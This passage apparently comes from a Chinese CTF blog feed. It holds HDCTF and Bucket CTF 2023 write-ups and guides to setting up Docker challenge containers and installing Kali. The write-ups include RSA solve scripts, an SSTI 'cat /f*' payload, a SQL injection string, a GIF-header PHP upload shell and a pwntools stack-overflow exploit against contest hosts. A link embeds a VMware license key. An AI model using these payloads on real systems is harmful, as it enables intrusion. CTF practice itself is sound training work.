class="hljs-string">&quot;c = &#123;c&#125;&quot;</span>)<br>&#x27;&#x27;&#x27;<br>P = <span class="hljs-number">67732476934455</span><span class="hljs-number">39441213578786</span><span class="hljs-number">58164413604303</span><span class="hljs-number">52426202652517</span><span class="hljs-number">25630106817272</span><span class="hljs-number">21242832528326</span><span class="hljs-number">24173647864512</span><span class="hljs-number">80269516220237</span><span class="hljs-number">28956790405537</span><span class="hljs-number">19625647108885</span><span class="hljs-number">10272312707201</span><br>Q = <span class="hljs-number">44943699913039</span><span class="hljs-number">04735745683555</span><span class="hljs-number">99253785124935</span><span class="hljs-number">23252980366265</span><span class="hljs-number">68689992512315</span><span class="hljs-number">78871498901850</span><span class="hljs-number">55864945749408</span><span class="hljs-number">51410046165567</span><span class="hljs-number">64745351531136</span><span class="hljs-number">31214288057465</span><span class="hljs-number">77666829197522</span><span class="hljs-number">08487764014055</span><span class="hljs-number">31599573114898</span><span class="hljs-number">49245299084777</span><span class="hljs-number">46280355525815</span><span class="hljs-number">39370236080368</span><span class="hljs-number">45764352315892</span><span class="hljs-number">05655041120058</span><span class="hljs-number">43410442573511</span><span class="hljs-number">09530623390649</span><span class="hljs-number">82042036595371</span><span class="hljs-number">35943420051121</span><br>n = <span class="hljs-number">47856138884659</span><span class="hljs-number">91171479248142</span><span class="hljs-number">01545330914954</span><span class="hljs-number">88887554533679</span><span class="hljs-number">91501772592797</span><span class="hljs-number">68607546542681</span><span class="hljs-number">55915287731234</span><span class="hljs-number">74962122102667</span><span class="hljs-number">47589353208734</span><span class="hljs-number">39009047998314</span><span class="hljs-number">74817826058951</span><span class="hljs-number">26560707889348</span><span class="hljs-number">73578785012807</span><span class="hljs-number">82935653048309</span><span class="hljs-number">49943017021401</span><span class="hljs-number">54224929273239</span><span class="hljs-number">61394806106719</span><span class="hljs-number">56916845789004</span><span class="hljs-number">02230271191153</span><span class="hljs-number">92961801582406</span><span class="hljs-number">28716764426631</span><span class="hljs-number">98982767857877</span><span class="hljs-number">30947633037300</span><span class="hljs-number">31709845340985</span><span class="hljs-number">14109361404881</span><span class="hljs-number">50390919951503</span><span class="hljs-number">76752251780903</span><span class="hljs-number">547456</span>7<br>c = <span class="hljs-number">22470275616367</span><span class="hljs-number">91381460194811</span><span class="hljs-number">20552008515085</span><span class="hljs-number">12117959567509</span><span class="hljs-number">55965051548230</span><span class="hljs-number">84423321246252</span><span class="hljs-number">51631079170677</span><span class="hljs-number">68507367576366</span><span class="hljs-number">32703584608953</span><span class="hljs-number">49160905213572</span><span class="hljs-number">12722275045521</span><span class="hljs-number">11107710669572</span><span class="hljs-number">17809438572315</span><span class="hljs-number">70836500588468</span><span class="hljs-number">48762081989368</span><span class="hljs-number">88305708421767</span><span class="hljs-number">95906808347617</span><span class="hljs-number">42135398309463</span><span class="hljs-number">92909791584139</span><span class="hljs-number">35035603633331</span><span class="hljs-number">78697822743915</span><span class="hljs-number">50423651307996</span><span class="hljs-number">47385116773171</span><span class="hljs-number">90667040953515</span><span class="hljs-number">71843913528888</span><span class="hljs-number">75130028955334</span><span class="hljs-number">87472720629214</span><span class="hljs-number">695054</span>4<br>&#x27;&#x27;&#x27;<br><br></code></pre></td></tr></table></figure><h3 id="Normal-Rsa-revenge"><a href="#Normal-Rsa-revenge" class="headerlink" title="Normal_Rsa(revenge)"></a>Normal_Rsa(revenge)</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs 1c">from Crypto.Util.number import *<br><span class="hljs-meta">#from shin import flag</span><br><br><br>m=bytes_to_long(b&#x27;HDCTF&#123;******&#125;&#x27;)<br>e=<span class="hljs-number">65537</span><br>p=getPrime(<span class="hljs-number">256</span>)<br>q=getPrime(<span class="hljs-number">512</span>)<br>r=getPrime(<span class="hljs-number">512</span>)<br>n=p*q*r<br>P=<span class="hljs-built_in">pow</span>(p,<span class="hljs-number">2</span>,n)<br>Q=<span class="hljs-built_in">pow</span>(q,<span class="hljs-number">2</span>,n)<br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br>print(f<span class="hljs-string">&quot;P = &#123;P&#125;&quot;</span>)<br>print(f<span class="hljs-string">&quot;Q = &#123;Q&#125;&quot;</span>)<br>print(f<span class="hljs-string">&quot;n = &#123;n&#125;&quot;</span>)<br>print(f<span class="hljs-string">&quot;c = &#123;c&#125;&quot;</span>)<br>&#x27;&#x27;&#x27;<br>P = <span class="hljs-number">87602103743628</span><span class="hljs-number">48654680470219</span><span class="hljs-number">30996225069780</span><span class="hljs-number">83349430360494</span><span class="hljs-number">50523139299289</span><span class="hljs-number">45131156330752</span><span class="hljs-number">46471928309096</span><span class="hljs-number">10600414977679</span><span class="hljs-number">14698031460212</span><span class="hljs-number">49631057727807</span><span class="hljs-number">82771611415961</span><br>Q = <span class="hljs-number">11292216403905</span><span class="hljs-number">99001998892017</span><span class="hljs-number">85103245191294</span><span class="hljs-number">29215375106571</span><span class="hljs-number">95574171341112</span><span class="hljs-number">70255457254419</span><span class="hljs-number">54222699179112</span><span class="hljs-number">65719326034947</span><span class="hljs-number">83040069250074</span><span class="hljs-number">26544778496293</span><span class="hljs-number">02547879079782</span><span class="hljs-number">86600866688977</span><span class="hljs-number">26172338853139</span><span class="hljs-number">41284773381173</span><span class="hljs-number">84319760669476</span><span class="hljs-number">85350617978367</span><span class="hljs-number">49577917101096</span><span class="hljs-number">94089037373611</span><span class="hljs-number">51608926781707</span><span class="hljs-number">48636852474402</span><span class="hljs-number">04926676748540</span><span class="hljs-number">11058417282140</span>1<br>n = <span class="hljs-number">12260605124589</span><span class="hljs-number">73669989677223</span><span class="hljs-number">63161467086815</span><span class="hljs-number">43140877060257</span><span class="hljs-number">85975778940760</span><span class="hljs-number">31374094277716</span><span class="hljs-number">51536724218984</span><span class="hljs-number">02365268019320</span><span class="hljs-number">80199394515394</span><span class="hljs-number">27781667333168</span><span class="hljs-number">26780160348492</span><span class="hljs-number">15165262971365</span><span class="hljs-number">07792965087544</span><span class="hljs-number">39591227194425</span><span class="hljs-number">75350878771121</span><span class="hljs-number">72195116066600</span><span class="hljs-number">14152044446616</span><span class="hljs-number">50906549431924</span><span class="hljs-number">37314974202605</span><span class="hljs-number">81765087483888</span><span class="hljs-number">70652608351453</span><span class="hljs-number">10202223862370</span><span class="hljs-number">94238507996028</span><span class="hljs-number">47611501980338</span><span class="hljs-number">10408432423049</span><span class="hljs-number">42315516153707</span><span class="hljs-number">24277025122111</span><span class="hljs-number">22538749</span><br>c = <span class="hljs-number">70721376513892</span><span class="hljs-number">18220368861685</span><span class="hljs-number">87140005141284</span><span class="hljs-number">90067843534158</span><span class="hljs-number">43217734634414</span><span class="hljs-number">63315143907150</span><span class="hljs-number">19977289070267</span><span class="hljs-number">71187082554241</span><span class="hljs-number">54814051177833</span><span class="hljs-number">98256782959709</span><span class="hljs-number">01188560688120</span><span class="hljs-number">35173277401357</span><span class="hljs-number">54397389883146</span><span class="hljs-number">65372544333857</span><span class="hljs-number">25254889589696</span><span class="hljs-number">89386035085675</span><span class="hljs-number">09519521067106</span><span class="hljs-number">46294734182046</span><span class="hljs-number">23815845770742</span><span class="hljs-number">92318137318996</span><span class="hljs-number">95831288930702</span><span class="hljs-number">41819258088177</span><span class="hljs-number">92124688476198</span><span class="hljs-number">83707955120438</span><span class="hljs-number">80557762094414</span><span class="hljs-number">29996815747449</span><span class="hljs-number">81554616337130</span><span class="hljs-number">096378</span>5<br>&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> Crypto.Util.number import *<br>import gmpy2<br><span class="hljs-attribute">e</span>=65537<br>P = 8760210374362848654680470219309962250697808334943036049450523139299289451311563307524647192830909610600414977679146980314602124963105772780782771611415961<br>Q = 112922164039059900199889201785103245191294292153751065719557417134111270255457254419542226991791126571932603494783040069250074265447784962930254787907978286600866688977261723388531394128477338117384319760669476853506179783674957791710109694089037373611516089267817074863685247440204926676748540110584172821401<br>n = 12260605124589736699896772236316146708681543140877060257859757789407603137409427771651536724218984023652680193208019939451539427781667333168267801603484921516526297136507792965087544395912271944257535087877112172195116066600141520444466165090654943192437314974202605817650874838887065260835145310202223862370942385079960284761150198033810408432423049423155161537072427702512211122538749<br>c = 7072137651389218220368861685871400051412849006784353415843217734634414633151439071501997728907026771187082554241548140511778339825678295970901188560688120351732774013575439738988314665372544333857252548895896968938603508567509519521067106462947341820462381584577074292318137318996958312889307024181925808817792124688476198837079551204388055776209441429996815747449815546163371300963785<br>p,<span class="hljs-attribute">s</span>=gmpy2.iroot(P,2)<br>q,<span class="hljs-attribute">s</span>=gmpy2.iroot(Q,2)<br><span class="hljs-attribute">r</span>=n//(p*q)<br>phi=(p-1)*(q-1)*(r-1)<br><span class="hljs-attribute">d</span>=gmpy2.invert(e,phi)<br><span class="hljs-attribute">m</span>=pow(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment">#b&#x27;HDCTF&#123;08c66aa2-f8ea-49a2-a84f-ab9c7999ebb2&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h3 id="hardMisc"><a href="#hardMisc" class="headerlink" title="hardMisc"></a>hardMisc</h3><p>zsteg嗦<br><img src="https://c.img.dasctf.com/images/2023423/1682224986974-e7064f5e-ea57-4ea0-9354-65936a585615.png"><br><img src="https://c.img.dasctf.com/images/2023423/1682224986448-84eb6575-e73e-4cc2-b870-768866396a8e.png"></p><h3 id="ExtremeMisc"><a href="#ExtremeMisc" class="headerlink" title="ExtremeMisc"></a>ExtremeMisc</h3><p>binwalk分离出压缩包<br>爆破密码为<code>haida</code><br>解出来得到双字节逆序的zip<br><a href="https://github.com/AabyssZG/FileReverse-Tools">https://github.com/AabyssZG/FileReverse-Tools</a><br><code>python FileReverse-Tools.py -re Reverse.piz</code><br>得到逆序好的zip，改后缀为.zip<br>继续爆破得到密码<code>9724</code><br>secret.zip里的文件没密码里面是secret.txt，另一个压缩包里也有，对比crc32相同，明文攻击<br><img src="https://c.img.dasctf.com/images/2023423/1682224986896-54a55cda-45c9-4588-a489-6cff350bf86f.png"><br><code>NSSCTF&#123;u_a_a_master_@_c0mpRe553d_PaCKe1s&#125;</code></p><h3 id="MasterMisc"><a href="#MasterMisc" class="headerlink" title="MasterMisc"></a>MasterMisc</h3><p>合并压缩包：linux：<code>cat *.001 *.002 *.003 *.004 *.005 *.006 &gt; x.zip</code><br>爆破密码：5483<br>解压得到：<br><img src="https://c.img.dasctf.com/images/2023423/1682224986901-e30b51a5-77df-4436-af3e-f431ae584089.png"><br><img src="https://c.img.dasctf.com/images/2023423/1682224986876-1fdfe868-7a1b-458c-affc-13fc0d92ecc7.png"><br>看图片提示010打开找flag3<br>foremost分离<br>得到一个图片一个音频<br>图片爆破长宽高<br><img src="https://c.img.dasctf.com/images/2023423/1682224986859-b0fc8a04-95ac-4473-bc7d-46456973b660.png"><br>得到flag2<br>音频：<br>看频谱图<br><img src="https://c.img.dasctf.com/images/2023423/1682224985696-1933fe6c-19b2-4fa3-acae-a018d0e61fae.png"><br>得到flag1<br><code> HDCTF&#123;e67d8104-7536-4433-bfff-96759901c405&#125;  </code></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="Welcome-To-HDCTF-2023"><a href="#Welcome-To-HDCTF-2023" class="headerlink" title="Welcome To HDCTF 2023"></a>Welcome To HDCTF 2023</h3><p><img src="https://c.img.dasctf.com/images/2023423/1682224986860-0083d8c8-329c-4f19-9f8a-d661a2e3a1b6.png"><br>jsfuck直接控制台<br><img src="https://c.img.dasctf.com/images/2023423/1682226407073-c9fb5d9d-5838-4295-a38e-adc486d76ec8.png"></p><h3 id="SearchMaster"><a href="#SearchMaster" class="headerlink" title="SearchMaster"></a>SearchMaster</h3><p><img src="https://c.img.dasctf.com/images/2023423/1682224986800-2ad459bb-de9d-4819-a9d1-e836f0c82458.png"><br>………….<br>post一个data，ssti<br>payload：<code>data=&#123;if system(&#39;cat /f*&#39;)&#125;&#123;/if&#125;</code><br><img src="https://c.img.dasctf.com/images/2023423/1682224986833-58bab911-406e-4205-b118-317dc6608d39.png"></p><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h3 id="easy-re"><a href="#easy-re" class="headerlink" title="easy_re"></a>easy_re</h3><p>upx脱壳<br><code>upx -d file</code><br>ida打开看main函数数里有base64字符串，解密就行</p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h3 id="pwnner"><a href="#pwnner" class="headerlink" title="pwnner"></a>pwnner</h3><p>随机数预测+栈溢出<br>exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./pwnner&#x27;)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>x = remote(<span class="hljs-string">&#x27;node6.anna.nssctf.cn&#x27;</span>,28888)<br>x.recvuntil(<span class="hljs-string">&#x27;you should prove that you love pwn,so input your name:&#x27;</span>)<br>x.send(b<span class="hljs-string">&#x27;1956681178&#x27;</span>)<br>payload = b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*64</span>+b<span class="hljs-string">&#x27;b&#x27;</span><span class="hljs-number">*8</span>+p64(0x4008b2)<br>x.send(payload)<br>x.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bucket CTF 2023-wp</title>
    <link href="/2023/04/18/Bucket%20CTF%202023/"/>
    <url>/2023/04/18/Bucket%20CTF%202023/</url>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="sqli1"><a href="#sqli1" class="headerlink" title="sqli1"></a>sqli1</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #<br></code></pre></td></tr></table></figure><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #<br></code></pre></td></tr></table></figure><h3 id="sqli2"><a href="#sqli2" class="headerlink" title="sqli2"></a>sqli2</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #<br></code></pre></td></tr></table></figure><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><h3 id="sqli3"><a href="#sqli3" class="headerlink" title="sqli3"></a>sqli3</h3><h4 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h4><p>Finally! I moved the secret into a <strong>COMPLETELY</strong> different table. There is <strong>NO</strong> way you can find it now.</p><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><p>sqlmap:<br>1.txt:<br><img src="https://c.img.dasctf.com/images/2023417/1681737646797-c2d6e049-bf32-490f-b539-adcb5e1997dc.png"></p><h3 id="Ping-check"><a href="#Ping-check" class="headerlink" title="Ping check"></a>Ping check</h3><h4 id="题目说明-1"><a href="#题目说明-1" class="headerlink" title="题目说明"></a>题目说明</h4><p>WEB<br>EASY<br>Did you know that this CTF is run on <a href="https://github.com/EmergencyBucket/pail">custom built open source software</a>? Note: The flag is not in the usual bucket{} format.<br>Do not overthink.<br>You don’t need to go to any other page.</p><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><p>题目说明里有网站源码：<a href="https://github.com/EmergencyBucket/pail">https://github.com/EmergencyBucket/pail</a><br><img src="https://c.img.dasctf.com/images/2023417/1681737664294-96f2b9e5-769f-418d-883b-affc308ae1b4.png"></p><h3 id="Gif"><a href="#Gif" class="headerlink" title="Gif"></a>Gif</h3><h4 id="题目说明-2"><a href="#题目说明-2" class="headerlink" title="题目说明"></a>题目说明</h4><p>I made a <strong>secure</strong> php web app where I can upload all my gifs. Some people on the internet told me to run it in a docker container just to protect it from my personal files, but who cares.</p><h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="https://c.img.dasctf.com/images/2023417/1681737674775-5c92e9f7-bb7d-4253-904f-32c8a9719bc2.png"><br>看他的表单提交，接收2个参数，文件名，和文件<br><img src="https://c.img.dasctf.com/images/2023417/1681737682403-8a0bb99f-876a-4ede-a0d8-0b7ae934e202.png"><br>需要加个gif的magic header <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">https://en.wikipedia.org/wiki/List_of_file_signatures</a><br><img src="https://c.img.dasctf.com/images/2023417/1681738088838-d94af952-59b4-4d03-ac9a-fd838c783ab8.png"><br><img src="https://c.img.dasctf.com/images/2023417/1681737699420-bcafc684-8134-4abf-a840-61386bcdfb1a.png"><br>貌似不能eval，直接system执行命令可以<br><img src="https://c.img.dasctf.com/images/2023417/1681737707376-2c33a240-2e4e-4714-a6af-94fab843aebf.png"><br><img src="https://c.img.dasctf.com/images/2023417/1681737714395-3b56b13c-813b-46ff-8bff-dda39f32fab8.png"></p><h3 id="sqli4"><a href="#sqli4" class="headerlink" title="sqli4"></a>sqli4</h3><p>貌似和3一样<br><img src="https://c.img.dasctf.com/images/2023417/1681737722357-3378f2a9-21a5-4db5-91a2-06358e4f6ec5.png"></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Apps"><a href="#Apps" class="headerlink" title="Apps"></a>Apps</h3><h4 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="https://c.img.dasctf.com/images/2023417/1681737732590-e9b3aea7-5685-4c79-85fe-8e67c48344a5.png"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="minecraft"><a href="#minecraft" class="headerlink" title="minecraft"></a>minecraft</h3><h4 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="https://c.img.dasctf.com/images/2023417/1681737741855-a73ed541-8aeb-4007-95bd-b35c7b738b93.png"></p><h3 id="Discord"><a href="#Discord" class="headerlink" title="Discord"></a>Discord</h3><h4 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路:"></a>解题思路:</h4><p><img src="https://c.img.dasctf.com/images/2023417/1681737749433-e41b262e-672b-4bfb-8e7a-daa75db02535.png"></p><h3 id="Transmission"><a href="#Transmission" class="headerlink" title="Transmission"></a>Transmission</h3><h4 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="https://c.img.dasctf.com/images/2023417/1681737756700-6a075b2a-3beb-4626-a985-a1af0612be06.png"></p><h3 id="P-clocks-解题做题人"><a href="#P-clocks-解题做题人" class="headerlink" title="P | clocks | 解题做题人"></a>P | clocks | 解题做题人</h3><h4 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tshark -r clocks_medium.pcap -T fields -e frame.time_delta | <span class="hljs-built_in">cut</span> -c3-3 | <span class="hljs-built_in">tr</span> <span class="hljs-string">&#x27;15&#x27;</span> <span class="hljs-string">&#x27;01&#x27;</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span> | <span class="hljs-built_in">cut</span> -c2- | perl -lpe <span class="hljs-string">&#x27;$_=pack&quot;B*&quot;,$_&#x27;</span></span><br>bucket&#123;look_at_the_times_sometimes&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker 部署ctf动态靶机</title>
    <link href="/2023/03/24/docker%20%E9%83%A8%E7%BD%B2ctf%E5%8A%A8%E6%80%81%E9%9D%B6%E6%9C%BA/"/>
    <url>/2023/03/24/docker%20%E9%83%A8%E7%BD%B2ctf%E5%8A%A8%E6%80%81%E9%9D%B6%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<p><del>坐大牢了呜呜呜</del><br>本文在ubuntu20.04 下进行，且Linux安装，换源以及相关工具和操作已经准备完毕</p><h3 id="docker-安装"><a href="#docker-安装" class="headerlink" title="docker 安装"></a>docker 安装</h3><p>首先先进入根目录<br><code>cd /</code><br>然后进入root //注意最好不要退出root，为了避免你们出错，我命令都加了sudo，如果已一直是su了就可以不用<br><code>su</code><br>然后<br><code>curl -fsSL [https://get.docker.com](https://get.docker.com) | bash -s docker --mirror Aliyun</code><br>然后 <code>docker images</code><br><img src="/note/docker/1.png"><br>如图则为安装成功</p><h3 id="配置dockerhub加速"><a href="#配置dockerhub加速" class="headerlink" title="配置dockerhub加速"></a>配置dockerhub加速</h3><p><a href="https://www.aliyun.com/">https://www.aliyun.com/</a><br>注册一个账号<br>然后在搜索框搜“容器”得到以下界面<br><img src="/note/docker/2.png"><br>然后<br><img src="/note/docker/3.png"><br>然后<br><img src="/note/docker/4.png"><br><img src="/note/docker/5.png"><br>然后输入<code>docker info</code><br>出现<img src="/note/docker/6.png">则为成功</p><h3 id="docker-compose安装"><a href="#docker-compose安装" class="headerlink" title="docker-compose安装"></a>docker-compose安装</h3><p><code>sudo curl -L https://github.com/docker/compose/releases/download/1.16.1/docker-compose-</code>uname -s<code>-</code>uname -m<code> -o /usr/local/bin/docker-compose</code><br>或者<br><code>sudo curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.1/docker-compose-</code>uname -s<code>-</code>uname -m<code> -o /usr/local/bin/docker-compose</code><br>然后授权<br><code>sudo chmod +x /usr/local/bin/docker-compose</code><br>然后输入检查<br><code>docker-compose --version</code><br><img src="/note/docker/7.png"><br>返回版本就成功了捏</p><h3 id="dockerhub"><a href="#dockerhub" class="headerlink" title="dockerhub"></a>dockerhub</h3><p><a href="https://hub.docker.com/">https://hub.docker.com/</a><br>注册一个账号<br>然后在ubuntu登录<br><code>sudo docker login</code><br>然后把你的题目文件夹丢进去虚拟机<br>以下以一个web题为例子<br>进入到你题目文件夹<br><img src="/note/docker/8.png"><br>源码和sh放在同一个目录下，Dockerfile放在与src目录平行的位置<br><img src="/note/docker/9.png"><br>Dockerfile：<br>内容如下</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ctftraining/base_image_nginx_mysql_php_73      //基础镜像<br><span class="hljs-keyword">LABEL</span><span class="language-bash"> Author=<span class="hljs-string">&quot;J_0k3r&quot;</span>                               //作者</span><br><span class="hljs-keyword">LABEL</span><span class="language-bash"> Blog=<span class="hljs-string">&quot;https://j-0k3r.github.io/&quot;</span>        //博客</span><br>//上面这两行可有可无<br><span class="hljs-keyword">COPY</span><span class="language-bash"> src /var/www/html              //docker内执行的操作，把src的复制到后面的路径中</span><br></code></pre></td></tr></table></figure><p>flag.sh：<br>内容</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment">#!/bin/sh#必需的东西没什么好讲的</span><br>sed -i <span class="hljs-string">&quot;s/flag&#123;testflag&#125;/$GZCTF_FLAG/&quot;</span> /var/www/html/index.php <span class="hljs-comment">#使用平台的动态flag替换index.php中的flag，这里我使用的平台为GZCTF，因此动态flag环境变量为$GZCTF_FLAG，其他平台一般为$FLAG</span><br>export GZCTF_FLAG=<span class="hljs-string">&quot;&quot;</span><span class="hljs-comment">#这句应该是对接平台的动态flag接口</span><br></code></pre></td></tr></table></figure><p>使用时请务必把中文注释都删掉<br>上面的都准备好之后<br>开始本地搭镜像并且传到dockerhub<br><img src="/note/docker/10.png"><br>先在dockerhub建好，再本地搭<br><code>sudo docker build -t 用户名/题目名 .</code><br>用户名是你dockerhub登录的用户名，题目名要和你在dockerhub上面的一样（命令后面的.不要忘了<br><img src="/note/docker/11.png"><br>这样就是成功了<br>然后push到dockerhub<br><code>sudo docker push 用户名/题目名</code><br><img src="/note/docker/12.png"><br>然后就可以去dockerhub看看<br><img src="/note/docker/13.png"><br>然后就是测试题目了<br>这里就不展示测试了<br>到这，题目docker就搞定了<br>呜<del>呜呜，写完博客继续去坐牢给校赛测试题目了</del></p>]]></content>
    
    
    <categories>
      
      <category>环境配置</category>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kali linux 安装</title>
    <link href="/2023/03/24/kali%20linux%20%E5%AE%89%E8%A3%85/"/>
    <url>/2023/03/24/kali%20linux%20%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<p>看完这篇，安装kali有手就行</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><h3 id="kali镜像下载："><a href="#kali镜像下载：" class="headerlink" title="kali镜像下载："></a>kali镜像下载：</h3><p><code>https://www.kali.org/get-kali/#kali-installer-images</code></p><p><img src="https://c.img.dasctf.com/images/2023322/1679472416255-3c0b0afb-6300-476b-a99d-412dc6767975.png"></p><p>点3.6G这个按钮下载，如果下得慢，可以IDM多线程冲</p><p>下面这个是直接下链接</p><p><code>https://kali.download/base-images/kali-2023.1/kali-linux-2023.1-installer-amd64.iso</code></p><h3 id="vm下载："><a href="#vm下载：" class="headerlink" title="vm下载："></a>vm下载：</h3><p><a href="https://www.vmware.com/cn/products/workstation-pro/workstation-pro-evaluation.html">Download VMware Workstation Pro</a>  //官网 下载for Windows 版本<br>或者<br><a href="https://download3.vmware.com/software/WKST-1700-WIN/VMware-workstation-full-17.0.0-20800274.exe">https://download3.vmware.com/software/WKST-1700-WIN/VMware-workstation-full-17.0.0-20800274.exe</a>   //直接下载<br>vm 安装参考：<br><a href="https://www.isharepc.com/36181.html#:~:text=VMware%20Workstation%20PRO,17.0%E6%AD%A3%E5%BC%8F%E7%89%88%E6%BF%80%E6%B4%BB%E5%AF%86%E9%92%A5%201%EF%BC%8C%E5%8F%8C%E5%87%BBVMware-workstation-full-17.0.0-20800274.exe%EF%BC%8C%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6%202%EF%BC%8C%E8%BE%93%E5%85%A5%E6%89%B9%E9%87%8F%E6%BF%80%E6%B4%BB%E5%AF%86%E9%92%A5%EF%BC%9AJU090-6039P-08409-8J0QH-2YR7F%203%EF%BC%8C%E5%AE%89%E8%A3%85%E6%BF%80%E6%B4%BB%E5%AE%8C%E6%88%90%EF%BC%8CEnjoy">VMware Workstation PRO 17.0正式版+激活密钥 | 乐软博客</a></p><h2 id="镜像部署"><a href="#镜像部署" class="headerlink" title="镜像部署"></a>镜像部署</h2><p><strong>打开vm</strong><br><img src="https://c.img.dasctf.com/images/202337/1678168744455-79f996ec-2863-4cfc-846c-550be3ccf3ac.png"><br><strong>选择自定义(高级)选项，点击下一步</strong><br><img src="https://c.img.dasctf.com/images/202337/1678168765849-b9c3ce41-bee9-48b7-8cf1-6ca104bece71.png"></p><p><img src="https://c.img.dasctf.com/images/202337/1678168794092-dfbb18c4-b5d9-4d89-9ea0-e53c4b3d79d7.png"><br><strong>选择【稍后安装操作系统】，然后点击下一步</strong><br><img src="https://c.img.dasctf.com/images/202337/1678168802501-48d4eb55-72a9-4f1c-89bc-1b668f42ac38.png"><br>客户机操作系统选择【Linux】，版本选择【Debian】，直接选择64位，<strong>我们选择Debian，选择完成之后继续点击下一步</strong><br><img 